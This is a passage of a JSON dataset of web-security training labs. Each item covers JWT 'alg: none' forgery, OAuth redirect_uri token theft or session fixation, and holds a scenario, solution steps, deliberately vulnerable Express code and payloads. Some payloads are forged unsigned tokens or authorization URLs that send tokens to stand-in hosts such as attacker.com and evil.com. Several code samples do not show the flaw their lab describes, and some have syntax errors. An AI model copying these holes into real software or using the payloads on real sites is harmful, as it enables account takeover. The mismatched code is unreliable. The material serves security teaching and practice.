        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const SECRET = 'supersecretkey'; app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('Unauthorized'); const decoded = jwt.verify(token, SECRET); if (decoded.username !== 'carlos') return res.status(403).send('Forbidden'); res.send('Welcome Carlos!'); }); app.listen(4000, () => console.log('JWT Lab on http://localhost:4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      }
      ,
      {
        "Lab scenario": "OAuth misconfiguration leads to token hijacking via redirect_uri manipulation",
        "Lab Description": "The application uses OAuth 2.0 for third-party login integration. It implements the implicit flow and allows redirect_uri values to be manipulated without proper validation. An attacker can craft a malicious authorization URL to intercept access tokens. To solve: extract a valid access token for carlos and use it to access the user's dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to initiate OAuth login and capture the redirect URL pattern and client_id/redirect_uri used.",
          "Construct a malicious redirect_uri under your control (e.g., attacker.com) and craft a full authorization URL.",
          "Send the authorization link to the victim (social engineering assumed or simulate as Carlos) to obtain the access token from the fragment.",
          "Use Postman to call /api/user with the stolen access token in the Authorization header.",
          "Verify successful access to the user dashboard as carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const oauthClients = [{ client_id: 'trusted-client', redirect_uri: 'https://trusted.com/callback' }]; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const client = oauthClients.find(c => c.client_id === client_id); if (!client) return res.status(400).send('Invalid client'); res.redirect(`${redirect_uri}#access_token=abc123&token_type=bearer`); }); app.get('/api/user', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123') return res.send('Welcome Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Lab on http://localhost:4000'));",
        "payloads": [
          "https://auth.site.com/auth?client_id=trusted-client&redirect_uri=https://attacker.com/callback",
          "Authorization: Bearer abc123"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation vulnerability in GraphQL login mutation",
        "Lab Description": "The application uses a GraphQL endpoint for login, but does not invalidate the session token upon authentication. This allows an attacker to set a fixed session before the victim logs in. To solve: Fixate a session, trick the victim into logging in, then reuse the session ID to access the user's data.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "Use Postman to send an initial unauthenticated request to /graphql to obtain a session cookie.",
          "Send the fixed session to the victim via phishing or simulate their login with the same session ID.",
          "Once the victim logs in, their session is tied to your predefined session ID.",
          "Replay the session cookie on the /graphql endpoint to access protected data.",
          "Query for { me { email, name } } to verify access to carlosâ€™s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); app.use(express.json()); app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('mutation login')) { const { username, password } = req.body.variables; if (username === 'carlos' && password === 'password') req.session.user = 'carlos'; return res.json({ data: { login: true } }); } if (query.includes('me')) { if (req.session.user === 'carlos') return res.json({ data: { me: { name: 'Carlos', email: 'carlos@example.com' } } }); return res.status(403).json({ error: 'Unauthorized' }); } res.status(400).send('Bad Request'); }); app.listen(4000, () => console.log('GraphQL Session Fixation Lab on http://localhost:4000'));",
        "payloads": [
          "mutation login($username:String!, $password:String!) { login(username:$username, password:$password) }",
          "{ \"username\": \"carlos\", \"password\": \"password\" }",
          "query { me { name, email } }"
        ]
      }
      ,
      {
        "Lab scenario": "JWT signature bypass in authorization header",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for user session management. It decodes the token and verifies it using the algorithm specified in the token header. The implementation trusts the 'alg' field from user-controlled input, making it vulnerable to algorithm confusion. The application treats unsigned tokens as valid. To solve: forge an unsigned JWT to impersonate the admin user and access /admin/dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Capture a valid JWT using Burp Suite or browser dev tools from the Authorization header.",
          "2. Decode the JWT using jwt.io or Postman and examine the header and payload.",
          "3. Modify the header to set 'alg' to 'none' and the payload 'user' to 'admin'. Remove the signature.",
          "4. Replace the original token in the Authorization header with the crafted token.",
          "5. Send the request to /admin/dashboard and verify access to the admin page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.user === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access denied'); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Signature Bypass Lab running on http://localhost:4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
          "{\"alg\":\"none\"}.{ \"user\":\"admin\" }",
          "Authorization: Bearer <JWT without signature>"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation in login flow",
        "Lab Description": "The application issues a session cookie before authentication and does not regenerate the session ID after login. This allows an attacker to fix the session ID of a victim. The attacker can trick a victim into using a known session ID, and once they log in, the attacker can use the same session ID to hijack the session. To solve: gain access to Carlos's account using a fixed session ID.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to initiate a session and capture the Set-Cookie header (e.g., sessionId=abc123).",
          "2. Trick the victim into visiting a crafted link that includes the known session cookie (e.g., by using a CSRF-like redirect or injecting a malicious image).",
          "3. Wait until the victim logs in with the attacker-fixed session ID.",
          "4. Use the same session cookie to send a GET request to /my-account.",
          "5. Verify access to Carlos's account and extract personal data from the page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = user.username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username) res.send(`Account page for ${username}`); else res.status(403).send('Not authenticated'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
          "Cookie: sessionId=abc123",
          "GET /?sessionId=abc123",
          "Hijack session after login using pre-set ID"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth token theft using open redirect in callback URL",
        "Lab Description": "The application uses OAuth 2.0 with an implicit flow and accepts arbitrary redirect URIs after authorization. This introduces an open redirect vulnerability. An attacker can steal the access token by injecting a malicious redirect URL in the OAuth flow. To solve: craft a malicious OAuth URL that redirects the access token to an attacker-controlled domain and extract the token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Start Burp Suite and inspect the login with Google OAuth flow.",
          "2. Notice that the redirect_uri parameter is not validated strictly by the server.",
          "3. Construct a malicious OAuth authorization URL that includes your domain (e.g., https://attacker.com/callback#access_token=... as the redirect_uri).",
          "4. Trick the victim into clicking the crafted URL (via phishing or injected content).",
          "5. Extract the token from the redirected request captured in your server logs or Burp Collaborator and use it to access protected resources."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const token = req.query.token; res.send(`Logged in with token: ${token}`); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
        "payloads": [
          "https://auth.example.com/oauth/authorize?response_type=token&client_id=123&redirect_uri=https://evil.com/#access_token=steal",
          "OAuth redirect_uri=https://attacker.com#access_token=xyz",
          "Token leak via implicit flow redirection"
        ]
      }
      ,
      {
        "Lab scenario": "JWT tampering vulnerability in session validation middleware",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for session management. However, it incorrectly trusts the 'alg' field in the JWT header without enforcing strict validation. The application uses these tokens to identify authenticated users. To solve: Forge a valid JWT for the user 'carlos' and access their My account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept the JWT after logging in with your own account using Burp Suite.",
          "Decode the JWT using jwt.io or Burp Decoder and observe the use of 'alg': 'none'.",
          "Modify the JWT header to set 'alg' to 'none' and the payload to {\"username\": \"carlos\"}.",
          "Remove the JWT signature entirely and use Postman to submit an authenticated request with the modified token.",
          "Visit the /my-account endpoint while using the forged JWT to access Carlos's data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const users = ['carlos', 'admin', 'wiener']; app.get('/my-account', (req, res) => { const token = req.cookies.token; if (!token) return res.status(401).send('Not logged in'); const decoded = jwt.decode(token, { complete: true }); if (!decoded || !decoded.payload.username) return res.status(403).send('Invalid token'); if (!users.includes(decoded.payload.username)) return res.status(403).send('User not found'); res.send(`Account page for ${decoded.payload.username}`); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation via pre-authenticated session reuse in login handler",
        "Lab Description": "This application mishandles session IDs and does not issue a new session upon successful authentication. The attacker can set a fixed session ID before login and trick a victim into logging in with that same session. To solve: Log in as Carlos by forcing a session ID and reusing it post-login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start a browser session and use Burp Suite to intercept the GET /login request.",
          "Modify the request to include a custom cookie: session=attacker123.",
          "Send the link with the crafted session cookie to Carlos and simulate a login using social engineering or CSRF.",
          "Once Carlos logs in, reuse the same session cookie (attacker123) from your browser.",
          "Visit /account to confirm the session is authenticated as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'weak-secret', resave: false, saveUninitialized: true })); const users = { carlos: 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "Cookie: session=attacker123",
          "http://victim-site.com/login?phpsessid=attacker123",
          "Set-Cookie: session=attacker123; Path=/; HttpOnly"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth redirect URI manipulation in authorization endpoint",
        "Lab Description": "This application implements OAuth2 authorization but fails to strictly validate redirect URIs, allowing attackers to manipulate the flow and steal access tokens. The authorization server trusts unvalidated 'redirect_uri' values. To solve: Capture a valid OAuth token for Carlos and use it to call the protected /api/user endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to intercept the OAuth request initiated by the client and observe the redirect_uri parameter.",
          "Modify the redirect_uri parameter to point to your attacker-controlled domain (http://evil.com/callback).",
          "Send a phishing link with the modified URL to Carlos to trick him into authorizing.",
          "Capture the token in your hosted endpoint (http://evil.com/callback?access_token=...).",
          "Replay the stolen access token using Postman to call GET /api/user with Authorization: Bearer <token>."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, username } = req.query; if (username === 'carlos') { const token = 'carlos-oauth-token'; tokens[username] = token; res.redirect(`${redirect_uri}?access_token=${token}`); } else { res.status(400).send('Missing user'); } }); app.get('/api/user', (req, res) => { const authHeader = req.headers.authorization; if (authHeader && authHeader === 'Bearer carlos-oauth-token') { res.send('User: carlos, Email: carlos@example.com'); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "http://localhost:4000/auth?username=carlos&redirect_uri=http://evil.com/callback",
          "GET /api/user HTTP/1.1\nAuthorization: Bearer carlos-oauth-token",
          "http://victim-app.com/auth?redirect_uri=http://attacker.tld/callback"
        ]
      }
      ,
      {
        "Lab scenario": "JWT tampering vulnerability in session management",
        "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, it fails to properly verify the token's signature. The `alg` field in the JWT header is set to `none`, and the application accepts tokens without verifying their integrity. The application trusts all fields in the token, including the `username` claim. To solve: Forge a JWT that impersonates the user 'carlos' and access their account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Capture the JWT from a login request using Burp Suite.",
          "Use jwt.io or Burp Decoder to inspect the token and note the use of 'alg':'none'.",
          "Craft a new token with the payload {\"username\":\"carlos\"} and set the alg to none, leaving the signature blank.",
          "Replace your JWT cookie with the forged token using Burp's Modify Cookie feature.",
          "Refresh the /my-account endpoint and confirm access to Carlos's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(require('cookie-parser')()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'none' }); res.cookie('auth', token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token); if (decoded && decoded.username === 'carlos') { res.send('Account details for carlos'); } else { res.send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "JWT with header: {\"alg\":\"none\"} and payload: {\"username\":\"carlos\"}"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth token misconfiguration in API gateway authorization",
        "Lab Description": "The API gateway uses OAuth tokens for authorization. However, it fails to validate the 'aud' claim in the access token. This allows an attacker to reuse a token issued for a different client (token confusion). To solve: Use a valid OAuth access token from your own app and access the protected endpoint of a privileged client to view Carlos's email address.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to obtain a valid OAuth token from your registered client using the authorization code flow.",
          "Inspect the token in jwt.io and note the 'aud' claim is not specific to your client.",
          "Send a GET request to /api/client-a/data with your token in the Authorization header.",
          "Observe that the endpoint accepts your token and returns privileged data.",
          "Extract Carlosâ€™s email address from the response to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Missing token'); const payload = jwt.decode(token); req.user = payload; next(); }); app.get('/api/client-a/data', (req, res) => { if (req.user && req.user.scope.includes('read:data')) { res.json({ email: 'carlos@example.com' }); } else { res.status(403).send('Forbidden'); } }); const PORT = 3001; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "OAuth token from Client-B reused on Client-Aâ€™s endpoint",
          "Valid JWT with aud mismatch: {\"aud\":\"Client-B\", \"scope\":\"read:data\"}",
          "Access token from attacker app reused on protected resource"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation vulnerability in login handler",
        "Lab Description": "The application assigns session identifiers before authentication and does not regenerate them after login. This allows an attacker to set a fixed session and trick a victim into logging in under a known session ID. The attacker can then hijack the session. To solve: Fix a session, get Carlos to authenticate into it, and access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to browse to the site and capture the Set-Cookie header with session ID before login.",
          "Send a crafted link to Carlos with the fixed session ID via social engineering or intercept his browser.",
          "Once Carlos logs in using the fixed session, reuse the same session ID in your browser.",
          "Access /my-account with the hijacked session and confirm it loads Carlosâ€™s account.",
          "Validate the login success through a post-login token or visual change."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.get('/', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('Welcome to vulnerable site'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'letmein') { sessions[req.cookies.sid] = 'carlos'; res.send('Logged in'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); const PORT = 8080; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Fixed session ID: sid=knownvalue",
          "Trick victim into authenticating under sid=knownvalue",
          "Access /my-account with same sid cookie"
        ]
      }
      ,
      {
        "Lab scenario": "JWT algorithm confusion in API authorization",
        "Lab Description": "This lab exposes a REST API that uses JSON Web Tokens (JWTs) to control access. The server trusts the 'alg' field in the JWT header and does not validate its signature properly when 'alg' is set to 'none'. The application accepts user-supplied tokens without enforcing signature validation. To solve: craft a forged token to impersonate the admin user and access the protected /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to intercept a legitimate login request and capture the JWT returned in the Authorization header.",
          "Decode the JWT using jwt.io and inspect the payload structure and algorithm used.",
          "Change the alg header to 'none' and modify the payload's 'user' field to 'admin'. Remove the signature entirely.",
          "Use Postman to send a GET request to /admin with the manipulated JWT in the Authorization header.",
          "Verify access by confirming the admin panel content is returned in the response."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { 'admin': { role: 'admin' }, 'user': { role: 'user' } }; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.user === 'admin') return res.send('Admin Access Granted'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.user === 'admin') return res.send('Admin Access Granted'); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(JWT Lab running on http://localhost:${PORT}));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation via predictable session ID",
        "Lab Description": "This lab has a vulnerable login flow where session identifiers are issued before authentication and not regenerated after login. The session ID is predictable and can be shared across users. The application sets a cookie named session_id which is trusted without being rotated post-login. To solve: fix a session ID before login and force the victim to use it to hijack their authenticated session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to initiate a login flow and observe the issued session_id cookie prior to login.",
          "Note the format of the session ID (e.g., static prefix + incremental token).",
          "Send the login page with the fixed session ID to the victim (simulated).",
          "After the victim logs in using that session, reuse the same session ID in your browser.",
          "Access the /my-account endpoint using the fixed session ID and confirm access to victim's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; let users = { 'carlos': { password: 'secret', accountData: 'Sensitive Info' } }; app.get('/login', (req, res) => { let sid = 'sess_' + Math.floor(Math.random() * 1000); res.cookie('session_id', sid); res.send('Login page with pre-issued session'); }); app.post('/login', (req, res) => { let sid = req.cookies.session_id; let { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[sid] = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { let user = sessions[req.cookies.session_id]; if (user) res.send('Account data: ' + users[user].accountData); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
        "payloads": [
          "Cookie: session_id=sess_1337",
          "POST /login with Cookie: session_id=sess_1337",
          "GET /my-account with Cookie: session_id=sess_1337"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth misconfiguration token reuse attack",
        "Lab Description": "This lab simulates an OAuth authorization server that fails to validate audience claims (aud) on access tokens. As a result, tokens issued for one client can be reused against another. The client application does not verify whether the token was issued for its own audience. To solve: use a token issued for one OAuth client to access a protected endpoint in another context.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP or Postman to initiate OAuth flow and obtain an access token for a benign client (e.g., photo app).",
          "Decode the JWT access token and inspect the 'aud' claim which incorrectly allows all resources.",
          "Send the same token to a different application (e.g., finance app) that incorrectly skips audience validation.",
          "Use Postman to call GET /finance-data endpoint with the reused access token.",
          "Verify successful access and extract user financial data to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const financeData = { 'carlos': 'Bank Balance: $9000' }; app.get('/finance-data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, 'oauthsharedsecret');  if (payload.sub === 'carlos') { return res.send(financeData['carlos']); } return res.status(403).send('Access Denied'); } catch (e) { return res.status(401).send('Invalid token'); } }); const PORT = 5000; app.listen(PORT, () => console.log(OAuth Lab running on http://localhost:${PORT}));",
        "payloads": [
          "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJwaG90by1hcHAifQ.mFMeNz9sZHXvl_YceRmJRW2skH43FF3A54gtpPYsOKo",
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJhbGwifQ._DztOQpn9jK9i8I1vGE-FhKo8zEl5EtXfU2RoHOuWUs"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation via flawed login redirect",
        "Lab Description": "This lab implements a login flow that improperly handles session tokens. The application creates a session ID before authentication and does not regenerate it upon successful login. An attacker can abuse this behavior to fix their own session ID on a victimâ€™s account. To solve: Hijack Carlosâ€™s session by forcing a session ID fixation and access his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite Proxy to intercept GET /login request while logged out.",
          "Observe Set-Cookie header assigning a session value before login. Send this request to Burp Repeater.",
          "Note the fixed session value, and manually craft a phishing link: /login?sessionid=attackerSessionValue.",
          "Log in with Carlosâ€™s credentials while preserving the attackerâ€™s pre-set session ID.",
          "Verify that the session persists across pages by navigating to /account with attackerâ€™s session value."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret123', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Invalid login'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send('Account page for ' + req.session.user); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
        "payloads": [
          "GET /login?sessionid=attackerSession123",
          "POST /login HTTP/1.1 with Cookie: session=attackerSession123",
          "GET /account HTTP/1.1 with Cookie: session=attackerSession123"
        ]
      }
      ,
      {
        "Lab scenario": "JWT algorithm confusion leading to privilege escalation",
        "Lab Description": "This lab uses JWT for session management but accepts unsigned tokens by trusting the 'alg' value from the token header. This allows attackers to change the algorithm to 'none' and forge tokens with elevated privileges. To solve: Craft a forged token granting admin privileges and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture a JWT using Burp Suite while logged in as a normal user.",
          "Decode the JWT using jwt.io or Postman and observe 'alg': 'HS256'.",
          "Modify the header to 'alg': 'none' and add \"role\":\"admin\" to payload.",
          "Remove the signature and send the forged token using Burp Repeater.",
          "Send a GET request to /admin with the forged token as Authorization: Bearer [token] and confirm admin access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'jwtpass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secretkey'); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); } catch { res.status(400).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
          "{ \"alg\": \"none\", \"typ\": \"JWT\" }.{ \"username\": \"carlos\", \"role\": \"admin\" }.",
          "Authorization: Bearer [unsigned JWT with admin role]",
          "GET /admin HTTP/1.1 with unsigned token"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth misconfiguration leaking authorization codes",
        "Lab Description": "This lab uses OAuth for third-party login but fails to validate the redirect_uri properly. An attacker can abuse this to capture an authorization code meant for another user. To solve: Hijack Carlosâ€™s OAuth code and use it to log in as him.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to analyze the OAuth flow and locate redirect_uri parameter.",
          "Craft a malicious redirect_uri under attackerâ€™s control (e.g., https://attacker.com/callback).",
          "Send phishing link to Carlos: /auth?client_id=lab-client&redirect_uri=https://attacker.com/callback",
          "Capture Carlosâ€™s code via attacker-controlled endpoint.",
          "Send a request to /token endpoint exchanging the stolen code for an access token, then use it to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const oauthCodes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode123'; oauthCodes[code] = 'carlos'; const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); }); app.post('/token', (req, res) => { const { code } = req.body; if (oauthCodes[code]) res.json({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-carlos') res.send('Welcome back, carlos!'); else res.status(401).send('Unauthorized'); }); app.listen(3000);",
        "payloads": [
          "/auth?client_id=lab-client&redirect_uri=https://attacker.com/callback&state=1234",
          "POST /token HTTP/1.1 with code=authcode123",
          "Authorization: Bearer token-carlos",
          "GET /my-account HTTP/1.1 with Bearer token-carlos"
        ]
      }
      ,
       {
          "Lab scenario": "Session fixation via unvalidated token reuse in REST login flow",
          "Lab Description": "The application improperly handles session identifiers during login, allowing a pre-auth session token to persist after authentication. The application sets a session cookie before authentication and does not regenerate it upon successful login. To solve: Hijack a logged-in session by fixing the session ID prior to user authentication.",
          "Difficulty Level": "Medium",
          "Solution Steps": [
            "Use Burp Suite to intercept GET /login and record the pre-auth Set-Cookie header.",
            "Send a POST /login request using valid credentials but with the previously issued session cookie manually added.",
            "Observe that the session cookie remains unchanged after login, indicating successful fixation.",
            "Send the fixed session cookie to another browser and reuse it after the victim logs in.",
            "Access /my-account endpoint using the fixed cookie and verify session hijack."
          ],
          "Vulnerability name": "Authentication",
          "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = { 'carlos': 'letmein123' }; app.get('/login', (req, res) => { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sid', sid); res.send('Login page loaded'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password && sid && sessions[sid]) { sessions[sid].authenticated = true; res.send('Logged in'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.authenticated) { res.send('Welcome carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
          "payloads": [
            "POST /login HTTP/1.1 with Cookie: sid=sess_fixation",
            "GET /my-account HTTP/1.1 with Cookie: sid=sess_fixation"
          ]
        },
        {
          "Lab scenario": "JWT token signature spoofing using 'none' algorithm in Authorization header",
          "Lab Description": "The application uses JWTs for stateless session management but fails to enforce proper signature verification. The JWT validation logic accepts 'alg: none', allowing tampering of token payload. To solve: Forge a JWT for user carlos with 'admin: true' and access the protected resource.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Use Postman to login and capture the JWT from the Authorization: Bearer header.",
            "Decode the JWT and inspect the algorithm field in the header section.",
            "Craft a new JWT with {\"alg\":\"none\"} and payload {\"username\":\"carlos\",\"admin\":true}, and remove the signature.",
            "Replace the original token with the unsigned forged token in Authorization header.",
            "Send GET /admin/dashboard and verify privileged access."
          ],
          "Vulnerability name": "Authentication",
